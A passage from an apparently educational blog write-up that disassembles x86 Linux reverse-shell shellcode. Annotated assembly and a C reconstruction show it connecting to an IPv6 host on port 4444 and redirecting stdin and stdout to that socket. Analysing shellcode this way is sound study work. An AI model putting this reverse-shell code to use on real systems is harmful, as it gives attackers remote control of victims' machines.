&lt;span class=&quot;err&quot;&gt;00000006&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A01&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; AF_INET6&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000008&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A0A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; pointer to arguments of socket()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call socketcall(SYS_SOCKET, ...)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B066&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B301&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; C code: socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000010&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The instructions above create a &lt;code&gt;TCP&lt;/code&gt; socket based on the &lt;code&gt;IPv6&lt;/code&gt; protocol. The return value, stored into the register &lt;code&gt;EAX&lt;/code&gt; (and later moved into &lt;code&gt;ESI&lt;/code&gt;), is a file descriptor.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; save File Descriptor of the socket&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000012&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C6&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear ECX and EBX and push 0x00000000 to the stack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000014&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C9&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000016&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000018&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;I don't know exactly why the author pushed the DWORD &lt;code&gt;0x00000000&lt;/code&gt; two times, thus making the struct 32-bytes long, when the size should be only 28 bytes. If you know, please contact me.
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; bytes 24-27 of the sockaddr_in6 struct:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   value of sin6_scope_id: 0x00000000&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000019&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; bytes 8-23 of the sockaddr_in6 struct:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;    value of sin6_addr: fe80::250:56ff:fe22:364b (big-endian)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;FE22364B&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4b3622fe&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;68025056&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;FF&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff565002&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000024&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A00&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000026&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FE800000&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80fe&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Bytes in big-endian order representing the IPv6 address: &lt;code&gt;fe80::250:56ff:fe22:364b&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; bytes 4-7 of the sockaddr_in6 struct:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   value of sin6_flowinfo: 0x00000000&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; bytes 2-3 of the sockaddr_in6 struct:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   value of sin6_port: port 4444 in big-endian order&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6668115&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5c11&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; bytes 0-1 of the sockaddr_in6 struct:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   value of sin6_family: AF_INET6&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000030&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;66680&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A00&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; save the pointer to the sockaddr_in6 struct into ECX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000034&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of connect():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   size of the sockaddr_in6 struct (28 bytes): &lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000036&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A1C&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1c&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of connect():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to the sockaddr_in6 struct&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000038&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;51&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of connect():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   File Descriptor of the client socket&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000039&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;56&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear registers&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; socketcall() syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B066&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of socketcall():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   SYS_CONNECT call&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000040&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B303&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of socketcall():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to the arguments of SYS_CONNECT&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000042&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call socketcall() syscall, in turn calling connect(...)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000044&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The disassembly I analysed up until now can be converted into the following C code:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// create an IPv6 socket&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// allocate space for the struct containing IPv6 address and TCP port&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr_in6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// set the socket to use IPv6&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin6_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// convert the TCP port number to big-endian (instead of little-endian)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin6_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// convert the string to an IPv6 address (big-endian)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;inet_pton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;fe80::250:56ff:fe22:364b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin6_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// connect to fe80::250:56ff:fe22:364b:4444&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So, first it creates a &lt;code&gt;TCP socket&lt;/code&gt; based on the &lt;code&gt;IPv6&lt;/code&gt; protocol. After that, it connects the socket referred to by the file descriptor &lt;code&gt;fd&lt;/code&gt; to the address identified by:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP address: &lt;code&gt;fe80::250:56ff:fe22:364b&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;TCP port: &lt;code&gt;4444&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Next, the function &lt;code&gt;dup2&lt;/code&gt; is used for redirecting file descriptors.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EBX, setting it to 0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000046&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; compare EAX with EBX, if they are equal,&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   the flag ZF will be set, as cmp&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   simply subtracts the bytes&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000048&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D8&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; if the flag ZF is set, and the two registers are equal,&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   then jumps to 00000082 (calls nanosleep())&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000004&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7536&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x82&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of dup2():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   newfd: file descriptor to be redirected,&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   in this case stdin&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000004&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C9&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear ECX, EDX, EAX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000004&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;F7E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of dup2():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   oldfd, i.e. the destination of the redirection of&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   the file descriptor specified in the arg. newfd (ECX)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000050&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall dup2()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000052&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B03F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000054&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Redirect &lt;code&gt;stdin&lt;/code&gt; to the previously-created socket
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EAX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000056&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of dup2(): stdout&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000058&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;41&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of dup2(): the IPv6 socket&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000059&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall dup2()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B03F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000005&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Redirect &lt;code&gt;stdout&lt;/code&gt; to the previously-created socket
&lt;/sub&gt;&lt;/p&gt;
